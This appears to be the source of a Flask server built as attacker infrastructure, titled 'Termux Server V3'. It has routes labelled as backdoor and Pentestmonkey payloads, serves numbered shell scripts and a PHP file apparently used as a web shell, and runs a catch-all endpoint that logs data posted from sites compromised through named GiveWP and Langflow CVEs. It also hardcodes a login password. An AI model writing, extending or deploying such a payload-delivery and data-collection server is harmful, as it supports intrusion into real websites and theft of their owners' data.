import os
import re
import json
import shutil
import datetime
from pathlib import Path
from urllib.parse import unquote

from flask import (
    Flask, request, jsonify, make_response, 
    render_template_string, send_from_directory
)
from flask_httpauth import HTTPBasicAuth

# ══════════════════════════════════════════════════════════
# 1. CONFIGURATION & CONSTANTS
# ══════════════════════════════════════════════════════════

# Directories
ROOT_DIR = Path(os.getenv("ROOT_DIR", "./data")).resolve()
UPLOAD_ROOT = Path(os.getenv("UPLOAD_ROOT", "./uploads")).resolve()
BIN_DIR = Path(os.getenv("BIN_DIR", "./bin")).resolve()
LOG_FILE_DOMAIN = ROOT_DIR / "domain_logs.jsonl"

# Upload Settings
MAX_UPLOAD_MB = int(os.getenv("MAX_UPLOAD_MB", "500"))
API_TOKEN = os.getenv("API_TOKEN", "")  # Leave empty to disable upload auth

# Ensure base directories exist
for d in [ROOT_DIR, UPLOAD_ROOT, BIN_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# CVE Stack for catch-all routing
CVE_STACKS = {
    "CVE-2024-5932": ["wp-content", "plugins", "give"],
    "CVE-2026-33017": ["api", "langflow"]
}

# HTML Template for Header Info
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Client Fingerprinting</title></head>
<body>
    <h2>Server-Side Received HTTP Headers</h2>
    <ul>
        <li>User-Agent: {{ user_agent }}</li>
        <li>sec-ch-ua-model: {{ model }}</li>
        <li>sec-ch-ua-arch: {{ arch }}</li>
        <li>sec-ch-ua-bitness: {{ bitness }}</li>
        <li>sec-ch-ua-platform-version: {{ platform_ver }}</li>
    </ul>
</body>
</html>
"""

# ══════════════════════════════════════════════════════════
# 2. APP INITIALIZATION & AUTHENTICATION
# ══════════════════════════════════════════════════════════

app = Flask(__name__)
auth = HTTPBasicAuth()

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "ok", "ping": "pong"}), 200

# Basic Auth Users
USERS = {
    "gultard": "Poile12!+"
}

@auth.verify_password
def verify_password(username, password):
    if username in USERS and USERS[username] == password:
        return username
    return None

def requires_auth(f):
    """Decorator to enforce Basic Auth on specific routes."""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        return auth.login_required(f)(*args, **kwargs)
    return decorated

# ══════════════════════════════════════════════════════════
# 3. HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════

def resolve_upload_path(filepath: str) -> Path:
    """Resolve and jail the path inside UPLOAD_ROOT to prevent traversal."""
    target = (UPLOAD_ROOT / filepath.lstrip("/")).resolve()
    if not str(target).startswith(str(UPLOAD_ROOT)):
        raise ValueError("Path traversal detected")
    return target

def check_upload_auth():
    """Check X-Token header if API_TOKEN is configured."""
    if not API_TOKEN:
        return
    token = request.headers.get("X-Token", "")
    if token != API_TOKEN:
        raise PermissionError("Invalid or missing X-Token header")

def sanitize_filename(name: str) -> str:
    """Remove or replace characters illegal in Windows/Unix filenames."""
    return re.sub(r'[\\/*?:"<>|]', '_', name)

# ══════════════════════════════════════════════════════════
# 4. ROUTES: UI & CLIENT HINTS
# ══════════════════════════════════════════════════════════

@app.route('/')
@requires_auth
def index():
    return "<h1>Termux Server V3</h1><p>System Online.</p>"

@app.route('/header-info', methods=['GET'])
def header_info():
    context = {
        'user_agent': request.headers.get('User-Agent', ''),
        'model': request.headers.get('Sec-CH-UA-Model', 'Not Sent'),
        'arch': request.headers.get('Sec-CH-UA-Arch', 'Not Sent'),
        'bitness': request.headers.get('Sec-CH-UA-Bitness', 'Not Sent'),
        'platform_ver': request.headers.get('Sec-CH-UA-Platform-Version', 'Not Sent'),
    }

    response = make_response(render_template_string(HTML_TEMPLATE, **context))
    
    # Request Client Hints
    accept_ch = (
        'Sec-CH-UA-Model, Sec-CH-UA-Arch, Sec-CH-UA-Bitness, '
        'Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List'
    )
    response.headers['Accept-CH'] = accept_ch
    response.headers['Critical-CH'] = accept_ch
    response.headers['Permissions-Policy'] = 'ch-ua-model=(self), ch-ua-platform=(self)'
    
    return response

# ══════════════════════════════════════════════════════════
# 5. ROUTES: PAYLOADS & BACKDOORS
# ══════════════════════════════════════════════════════════

@app.route('/body')
def chankro_backdoor():
    # Assuming backdoor.html exists in templates/
    return render_template_string("<!-- Backdoor Template -->") 

@app.route('/kurinrin')
def fileless_pipe():
    return render_template_string("<!-- Pentestmonkey Template -->")

@app.route('/payloads/<int:shell_id>')
def serve_shell_payload(shell_id):
    if not (1 <= shell_id <= 5):
        return jsonify({"error": "Invalid shell ID"}), 404
    
    payload_file = BIN_DIR / f"shell_{shell_id}.sh"
    if payload_file.exists():
        return send_from_directory(BIN_DIR, payload_file.name)
    return jsonify({"error": "Payload not found"}), 404

# ══════════════════════════════════════════════════════════
# 6. ROUTES: FILE UPLOAD (FastAPI Logic Ported to Flask)
# ══════════════════════════════════════════════════════════

@app.route('/files/<path:filepath>', methods=['POST'])
def upload_file(filepath):
    try:
        # 1. Auth Check
        check_upload_auth()

        # 2. Path Resolution & Validation
        if filepath.endswith('/'):
            return jsonify({"error": "Path must include a filename"}), 400
            
        target = resolve_upload_path(filepath)

        # 3. Size Limit Check
        content_length = request.headers.get('Content-Length')
        if content_length and int(content_length) > MAX_UPLOAD_MB * 1024 * 1024:
            return jsonify({"error": f"Exceeds {MAX_UPLOAD_MB} MB limit"}), 413

        # 4. Stream and Save File
        target.parent.mkdir(parents=True, exist_ok=True)
        with open(target, 'wb') as f:
            shutil.copyfileobj(request.stream, f)

        size = target.stat().st_size
        return jsonify({
            "saved": str(target.relative_to(UPLOAD_ROOT)), 
            "bytes": size
        }), 201

    except ValueError as ve:
        return jsonify({"error": str(ve)}), 400
    except PermissionError as pe:
        return jsonify({"error": str(pe)}), 401
    except Exception as e:
        app.logger.error(f"Upload failed: {e}")
        return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════
# 7. ROUTES: CATCH-ALL & LOGGING
# ══════════════════════════════════════════════════════════

@app.route('/<path:subpath>', methods=['GET', 'POST'])
def catch_all(subpath):
    # 1. Normalize Path
    normalized_path = unquote(subpath).lower()
    detected_cve = None
    target_site = None

    # 2. Recognize CVE from query param (e.g., ?exec/CVE-2024-5932=website.com)
    for param, value in request.args.items():
        if param.upper().startswith("CVE-"):
            detected_cve = param.upper()
            target_site = value
            break

    # 3. Filter by CVE stack and path keywords
    if detected_cve and detected_cve in CVE_STACKS:
        keywords = CVE_STACKS[detected_cve]
        if normalized_path.startswith(keywords) or any(k in normalized_path for k in keywords):
            log_dir = ROOT_DIR / (detected_cve if detected_cve != "CVE-2026-33017" else "Langflow") / "Custom" / "LOGS"
            log_dir.mkdir(parents=True, exist_ok=True)

            if request.method == "POST":
                safe_domain = "unknown_target"
                if target_site:
                    clean = re.sub(r'^https?://', '', target_site)
                    clean = clean.split('/')[0].split(':')[0].split('?')[0]
                    safe_domain = sanitize_filename(clean)
                
                # Log the payload
                log_file = log_dir / f"{safe_domain}.json"
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(request.get_data(as_text=True) + "\n")

            return jsonify({"status": "logged", "cve": detected_cve}), 200

    # 4. Default Filebin / Bin serving logic
    return send_filebin(subpath)

def send_filebin(path):
    """Serve files from BIN_DIR and log domain requests."""
    log_entry = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "referrer": request.referrer,
        "user_agent": request.headers.get("User-Agent"),
        "requested_file": path,
        "full_path_query": request.full_path.rstrip('?')
    }

    try:
        with open(LOG_FILE_DOMAIN, "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")
    except Exception as e:
        app.logger.error(f"Failed to write to log: {e}")

    # Intercept specific pattern: /<12 chars>.php
    if re.match(r"^[a-zA-Z0-9]{12}\.php$", path):
        return send_from_directory(BIN_DIR, "sm.php")
         
    return send_from_directory(BIN_DIR, path)

# ══════════════════════════════════════════════════════════
# 8. MAIN EXECUTION
# ══════════════════════════════════════════════════════════

if __name__ == '__main__':
    # Note: Use a production WSGI server like Gunicorn or Waitress in production
    app.run(port=9999, host='127.0.0.1', debug=True)
